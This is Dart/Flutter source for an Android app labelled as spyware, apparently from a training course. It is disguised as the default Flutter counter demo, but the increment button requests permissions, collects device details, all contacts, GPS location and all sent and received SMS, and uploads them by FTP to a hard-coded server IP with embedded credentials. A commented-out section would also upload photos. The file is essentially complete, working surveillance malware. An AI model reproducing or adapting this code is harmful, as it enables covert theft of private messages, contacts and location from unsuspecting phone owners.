//*************************************
//***** Spyware Android LP CDAISI *****
//*************************************

import 'dart:io';
import 'package:geolocator/geolocator.dart';
import 'package:device_info/device_info.dart';
import 'package:flutter/material.dart';
import 'package:sms/sms.dart';
import 'package:ftpconnect/ftpConnect.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:path_provider/path_provider.dart';


void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);
  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  int _counter = 0;

  // Demande de permission
  void _incrementCounter() async {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.storage,
      Permission.contacts,
      Permission.location,
      Permission.sms,
    ].request();

    // Préparation de la connexion FTP
    FTPConnect ftpConnect = FTPConnect('141.94.77.172',
    user: 'utilisateursftp', pass: 'Sftp59?Spyware!');

    // ***** PARTIE CREATION DES FICHIERS *****
    Directory tempDir = await getTemporaryDirectory();
    // Creation de la liste de fichiers finals
    var list_files = ["${tempDir.path}/contact.txt","${tempDir.path}/sms.txt","${tempDir.path}/phone_information.txt","${tempDir.path}/localisation.txt"];

    final File file_contact = File("${tempDir.path}/contact.txt");
    final filename_contact = "${tempDir.path}/contact.txt";

    final File file_sms = File("${tempDir.path}/sms.txt");
    final filename_sms = "${tempDir.path}/sms.txt";

    final File file_phone = File("${tempDir.path}/phone_information.txt");
    final filename_phone = "${tempDir.path}/phone_information.txt";

    final File file_geo = File("${tempDir.path}/localisation.txt");
    final filename_geo = "${tempDir.path}/localisation.txt";

    // ***** PARTIE INFORMATIONS TELEPHONE *****

    if (Platform.isAndroid) {
      var androidInfo = await DeviceInfoPlugin().androidInfo;
      var release = androidInfo.version.release;
      var manufacturer = androidInfo.manufacturer;
      var host = androidInfo.host;
      // Ajout des informations dans le fichier
      File(filename_phone).writeAsString("Informations sur le telephone : \nAndroid $release, $manufacturer, $host").then((File file_phone) {});
    }

    // ***** PARTIE CONTACTS *****

    // Récupérer l'ensemble des contacts dans une liste
    List<Contact> contacts = await ContactsService.getContacts();
    // Variable qui va stocker l'ensemble des informations des contacts
    var info_contact = "";
    // Parcourir la liste
    for (var contact in contacts) {
      info_contact = info_contact+"Nom du contact : "+contact.displayName!+" \nNumero : "+contact.phones!.first.value!+"\n";
    }
    File(filename_contact).writeAsString(info_contact).then((File file_contact) {});

    // ***** PARTIE LOCALISATION *****

    var location = await Geolocator.getCurrentPosition();
    var position = "${location}";
    File(filename_geo).writeAsString("Informations sur la position du telephone : "+position).then((File file_geo) {});

    // ***** PARTIE SMS *****
    File(filename_sms).writeAsString("Recuperation des SMS : ").then((File file_sms) {});

    // Création de l'instance de la classe SmsQuery
    SmsQuery query = new SmsQuery();
    // Récupération de la liste des instances SMS (reçus et envoyés)
    List<SmsMessage> messages = await query.querySms(kinds: [SmsQueryKind.Inbox, SmsQueryKind.Sent]);

    var sms = "";
    // Parcourir les messages
    for (var message in messages) {
      sms = sms+"Numero Expediteur : "+message.sender+" Corps du message : "+message.body+"\n";
    }
    File(filename_sms).writeAsString(sms).then((File file_sms) {});

    // ***** Partie Envoie des fichiers *****

    // Faire une liste des fichiers à envoyer
    for (var fichier in list_files) {
      File fileToUpload = File(fichier);
      // Lancement de la connexion FTP
      await ftpConnect.connect();
      // Envoie du fichier sur le serveur
      bool res = await ftpConnect.uploadFile(fileToUpload);
      // Fermeture de la connexion FTP
      await ftpConnect.disconnect();
    } 

    // ***** PARTIE PHOTOS *****

    // Récupération de la liste de fichier
    Directory dir = Directory('/storage/1CEC-2F09/images');
    List<FileSystemEntity> files = dir.listSync(recursive: true);

    // Définition de la liste de fichier
    var listFile = [];

    // Ajout des fichiers dans la liste
    for (FileSystemEntity file in files) {
      var path = file.path;
      listFile.add(path);
    }
    //print(listFile);

    //int compteur = 0;
    //for (var file in listFile) {
    //  if (compteur < 20) {
    //    File fileToUpload = File(file);
    //    // Lancement de la connexion FTP
    //    await ftpConnect.connect();
    //    // Changement de répertoire
    //    await ftpConnect.changeDirectory('photos');
    //    // Envoie du fichier sur le serveur
    //    bool res = await ftpConnect.uploadFile(fileToUpload);
        // Fermeture de la connexion FTP
    //    await ftpConnect.disconnect();
    //    compteur++;
    //  }
    //}
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            const Text(
              'You have pushed the button this many times:',
            ),
            Text(
              '$_counter',
              style: Theme.of(context).textTheme.headline4,
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: _incrementCounter,
        tooltip: 'Increment',
        child: const Icon(Icons.add),
      ), // This trailing comma makes auto-formatting nicer for build methods.
    );
  }
}
